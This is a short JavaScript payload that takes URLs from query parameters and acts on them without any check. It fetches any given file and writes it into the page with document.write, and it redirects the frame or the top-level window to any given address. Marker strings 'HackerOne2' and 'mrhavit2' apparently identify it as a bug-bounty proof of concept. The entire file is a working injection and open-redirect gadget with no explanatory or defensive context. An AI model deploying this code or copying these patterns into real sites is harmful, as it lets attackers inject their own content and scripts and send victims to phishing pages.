(function () {
  var params = new URLSearchParams(window.location.search);

  var targetUrl = params.get("url");
  var parentUrl = params.get("parenturl");
  var fileUrl   = params.get("file");

  // If file= is present → fetch and render response
  if (fileUrl) {
    fetch(fileUrl)
      .then(function (res) {
        return res.text();
      })
      .then(function (data) {
        document.open();
        document.write(data);
        document.close();
      })
      .catch(function (e) {
        document.write("Error loading file");
      });
    return;
  }

  // Redirect the iframe itself
  if (targetUrl) {
    window.location.href = targetUrl;
    return;
  }

  // Redirect the parent window
  if (parentUrl) {
    window.top.location.href = parentUrl;
    return;
  }
})();

document.querySelectorAll(".auto-size-span")[0].textContent = "HackerOne2";
document.querySelectorAll(".auto-size-span")[1].textContent = "mrhavit2";